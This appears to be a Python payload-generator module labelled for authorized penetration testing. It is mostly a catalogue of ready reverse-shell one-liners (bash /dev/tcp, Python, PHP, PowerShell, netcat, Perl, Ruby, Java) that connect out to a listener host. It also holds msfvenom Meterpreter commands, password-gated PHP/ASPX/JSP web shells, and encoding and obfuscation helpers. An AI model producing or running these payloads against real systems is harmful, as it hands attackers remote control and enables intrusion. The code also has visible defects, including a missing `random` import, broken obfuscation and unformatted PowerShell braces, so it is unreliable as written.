"""
Chhoti Don - Payload Generator
Advanced payload generation for authorized penetration testing.
Supports reverse shells, web shells, encoders, and obfuscation.
Phase 2.2 - Medium Priority Feature

⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import base64
import string
import time
from typing import Dict, Generator, List, Optional# ==================================================

REVERSE_SHELLS = {

    # --------------------------------------------------
    # 🐍 Python
    # --------------------------------------------------
    "python_tcp": {
        "name": "Python TCP Reverse Shell",
        "language": "python",
        "os": ["linux", "windows", "mac"],
        "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "handler": "nc -lvnp {LPORT}",
        "tags": ["tcp", "python", "cross-platform"]
    },
    "python_b64": {
        "name": "Python Base64 Encoded",
        "language": "python",
        "os": ["linux", "windows"],
        "template": "python3 -c 'exec(__import__(\"base64\").b64decode(\"{B64_PAYLOAD}\"))'",
        "tags": ["encoded", "obfuscated", "python"]
    },

    # --------------------------------------------------
    # 🐚 Bash
    # --------------------------------------------------
    "bash_tcp": {
        "name": "Bash TCP Reverse Shell",
        "language": "bash",
        "os": ["linux", "mac"],
        "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "handler": "nc -lvnp {LPORT}",
        "tags": ["tcp", "bash", "linux"]
    },
    "bash_udp": {
        "name": "Bash UDP Reverse Shell",
        "language": "bash",
        "os": ["linux"],
        "template": "sh -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
        "tags": ["udp", "bash", "linux"]
    },

    # --------------------------------------------------
    # 🌐 PHP
    # --------------------------------------------------
    "php_exec": {
        "name": "PHP Exec Reverse Shell",
        "language": "php",
        "os": ["linux", "windows"],
        "template": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "handler": "nc -lvnp {LPORT}",
        "tags": ["php", "exec", "web"]
    },
    "php_system": {
        "name": "PHP System Webshell",
        "language": "php",
        "os": ["linux", "windows"],
        "template": "<?php system($_GET['cmd']); ?>",
        "tags": ["php", "webshell", "rce"]
    },
    "php_full_shell": {
        "name": "PHP Full Featured Webshell",
        "language": "php",
        "os": ["linux", "windows"],
        "template": "<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; } ?>",
        "tags": ["php", "webshell", "full"]
    },

    # --------------------------------------------------
    # 🪟 PowerShell
    # --------------------------------------------------
    "powershell_tcp": {
        "name": "PowerShell TCP Reverse Shell",
        "language": "powershell",
        "os": ["windows"],
        "template": "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "handler": "nc -lvnp {LPORT}",
        "tags": ["powershell", "tcp", "windows"]
    },
    "powershell_b64": {
        "name": "PowerShell Base64 Encoded",
        "language": "powershell",
        "os": ["windows"],
        "template": "powershell -EncodedCommand {B64_PAYLOAD}",
        "tags": ["encoded", "powershell", "windows", "bypass"]
    },

    # --------------------------------------------------
    # 🔧 Netcat
    # --------------------------------------------------
    "nc_traditional": {
        "name": "Netcat Traditional",
        "language": "bash",
        "os": ["linux"],
        "template": "nc -e /bin/sh {LHOST} {LPORT}",
        "handler": "nc -lvnp {LPORT}",
        "tags": ["netcat", "linux"]
    },
    "nc_openbsd": {
        "name": "Netcat OpenBSD (no -e)",
        "language": "bash",
        "os": ["linux"],
        "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
        "tags": ["netcat", "fifo", "linux"]
    },

    # --------------------------------------------------
    # ☕ Java
    # --------------------------------------------------
    "java_runtime": {
        "name": "Java Runtime Reverse Shell",
        "language": "java",
        "os": ["linux", "windows"],
        "template": "r = Runtime.getRuntime();p = r.exec(new String[]{{'/bin/bash','-c','exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done'}});p.waitFor();",
        "tags": ["java", "runtime", "cross-platform"]
    },

    # --------------------------------------------------
    # 🐧 Perl
    # --------------------------------------------------
    "perl_tcp": {
        "name": "Perl TCP Reverse Shell",
        "language": "perl",
        "os": ["linux"],
        "template": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "tags": ["perl", "tcp", "linux"]
    },

    # --------------------------------------------------
    # 🦀 Ruby
    # --------------------------------------------------
    "ruby_tcp": {
        "name": "Ruby TCP Reverse Shell",
        "language": "ruby",
        "os": ["linux"],
        "template": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "tags": ["ruby", "tcp", "linux"]
    },
}

# MSF Payload templates
MSF_PAYLOADS = {
    "windows_meterpreter": {
        "name": "Windows Meterpreter Reverse TCP",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
        "handler": "use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nrun",
        "os": "windows"
    },
    "linux_meterpreter": {
        "name": "Linux Meterpreter Reverse TCP",
        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
        "handler": "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nrun",
        "os": "linux"
    },
    "php_meterpreter": {
        "name": "PHP Meterpreter Reverse TCP",
        "command": "msfvenom -p php/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php",
        "os": "web"
    },
    "python_meterpreter": {
        "name": "Python Meterpreter",
        "command": "msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.py",
        "os": "cross-platform"
    },
    "aspx_meterpreter": {
        "name": "ASPX Meterpreter",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx",
        "os": "windows-web"
    },
}


# ==================================================
# 🎯 MAIN FUNCTIONS
# ==================================================

class PayloadGenerator:
    """
    Advanced Payload Generator for Authorized Pentesting.
    """

    def __init__(self):
        self.generated_count = 0

    # --------------------------------------------------
    # 🔫 Generate Reverse Shell
    # --------------------------------------------------
    def generate_reverse_shell(
        self,
        shell_type: str,
        lhost: str,
        lport: int,
        encode: bool = False,
        obfuscate: bool = False
    ) -> Dict:
        """
        Reverse shell payload generate karo.

        Args:
            shell_type: Shell type key (python_tcp, bash_tcp, etc.)
            lhost: Your listener IP
            lport: Your listener port
            encode: Base64 encode karna hai?
            obfuscate: Variable name obfuscation

        Returns:
            Complete payload dict
        """
        if shell_type not in REVERSE_SHELLS:
            available = list(REVERSE_SHELLS.keys())
            return {
                "status": "error",
                "message": f"Unknown shell type. Available: {available}"
            }

        template_data = REVERSE_SHELLS[shell_type].copy()
        payload = template_data["template"]

        # Substitute variables
        payload = payload.replace("{LHOST}", lhost)
        payload = payload.replace("{LPORT}", str(lport))

        # Encoding
        if encode or "{B64_PAYLOAD}" in payload:
            encoded = self._encode_payload(payload, template_data["language"])
            payload = payload.replace("{B64_PAYLOAD}", encoded)

        # Obfuscation
        if obfuscate:
            payload = self._obfuscate(payload, template_data["language"])

        # Handler command
        handler = template_data.get("handler", f"nc -lvnp {lport}")
        handler = handler.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))

        self.generated_count += 1

        return {
            "status": "success",
            "shell_type": shell_type,
            "name": template_data["name"],
            "payload": payload,
            "handler": handler,
            "lhost": lhost,
            "lport": lport,
            "language": template_data["language"],
            "os_support": template_data["os"],
            "tags": template_data.get("tags", []),
            "encoded": encode,
            "obfuscated": obfuscate,
            "length": len(payload),
            "generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        }

    # --------------------------------------------------
    # 📦 Generate MSF Payload
    # --------------------------------------------------
    def generate_msf_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int
    ) -> Dict:
        """
        Metasploit payload command generate karo.
        """
        if payload_type not in MSF_PAYLOADS:
            return {
                "status": "error",
                "message": f"Unknown MSF payload. Available: {list(MSF_PAYLOADS.keys())}"
            }

        data = MSF_PAYLOADS[payload_type].copy()
        command = data["command"].replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
        handler = data.get("handler", "").replace("{LHOST}", lhost).replace("{LPORT}", str(lport))

        return {
            "status": "success",
            "name": data["name"],
            "msfvenom_command": command,
            "handler_commands": handler,
            "os_target": data.get("os", "unknown"),
            "lhost": lhost,
            "lport": lport,
        }

    # --------------------------------------------------
    # 🌐 Web Shell Generator
    # --------------------------------------------------
    def generate_webshell(
        self,
        language: str = "php",
        password: str = None
    ) -> Dict:
        """
        Password-protected web shell generate karo.
        """
        if not password:
            password = self._random_string(8)

        shells = {
            "php": f"<?php if(md5($_GET['pass'])==='{self._md5(password)}'){{system($_GET['cmd']);}} ?>",
            "php_post": f"<?php if(isset($_POST['p'])&&md5($_POST['p'])==='{self._md5(password)}'){{system($_POST['c']);}} ?>",
            "aspx": f"<%@ Page Language=\"C#\" %><% if(Request[\"p\"]==\"{password}\"){{Response.Write(new System.Diagnostics.Process(){{StartInfo=new System.Diagnostics.ProcessStartInfo(\"cmd.exe\",\"/c \"+Request[\"c\"]){{RedirectStandardOutput=true,UseShellExecute=false}}}}.Start()?? null);}} %>",
            "jsp": f"<%if(request.getParameter(\"p\").equals(\"{password}\")){{Runtime rt=Runtime.getRuntime();String[] commands={{\"bash\",\"-c\",request.getParameter(\"c\")}};Process proc=rt.exec(commands);out.println(new java.util.Scanner(proc.getInputStream()).useDelimiter(\"\\\\A\").next());}}%>",
        }

        if language not in shells:
            return {"status": "error", "message": f"Unsupported language. Use: {list(shells.keys())}"}

        shell_code = shells[language]

        return {
            "status": "success",
            "language": language,
            "shell_code": shell_code,
            "password": password,
            "usage": f"http://target/shell.{language}?pass={password}&cmd=id" if "post" not in language else f"POST: p={password}&c=id",
            "length": len(shell_code),
        }

    # --------------------------------------------------
    # 🔒 Encoder
    # --------------------------------------------------
    def encode_payload(self, payload: str, encoding: str = "base64") -> Dict:
        """Payload encode karo."""
        encoders = {
            "base64": lambda p: base64.b64encode(p.encode()).decode(),
            "hex": lambda p: p.encode().hex(),
            "url": lambda p: "".join(f"%{ord(c):02x}" if not c.isalnum() else c for c in p),
        }

        if encoding not in encoders:
            return {"status": "error", "message": f"Unknown encoding: {list(encoders.keys())}"}

        encoded = encoders[encoding](payload)

        return {
            "status": "success",
            "original": payload,
            "encoded": encoded,
            "encoding": encoding,
            "length_original": len(payload),
            "length_encoded": len(encoded),
        }

    # --------------------------------------------------
    # 📋 List All Payloads
    # --------------------------------------------------
    def list_payloads(self, filter_os: str = None, filter_lang: str = None) -> Dict:
        """Available payloads list karo."""
        results = []

        for key, data in REVERSE_SHELLS.items():
            if filter_os and filter_os not in data.get("os", []):
                continue
            if filter_lang and data.get("language") != filter_lang:
                continue

            results.append({
                "key": key,
                "name": data["name"],
                "language": data["language"],
                "os": data["os"],
                "tags": data.get("tags", []),
            })

        return {
            "reverse_shells": results,
            "msf_payloads": list(MSF_PAYLOADS.keys()),
            "total": len(results),
        }

    # --------------------------------------------------
    # 🔧 Internal Helpers
    # --------------------------------------------------
    def _encode_payload(self, payload: str, language: str) -> str:
        """Language-specific encoding."""
        if language == "powershell":
            # PowerShell needs UTF-16LE encoding
            encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
        else:
            encoded = base64.b64encode(payload.encode()).decode()
        return encoded

    def _obfuscate(self, payload: str, language: str) -> str:
        """Basic variable name obfuscation."""
        if language == "python":
            # Simple variable substitution
            rand_var = self._random_string(4)
            payload = payload.replace("socket", f"s{rand_var}")
        return payload

    def _random_string(self, length: int) -> str:
        """Random string generate karo."""
        return "".join(random.choices(string.ascii_lowercase, k=length))

    def _md5(self, text: str) -> str:
        """MD5 hash."""
        import hashlib
        return hashlib.md5(text.encode()).hexdigest()
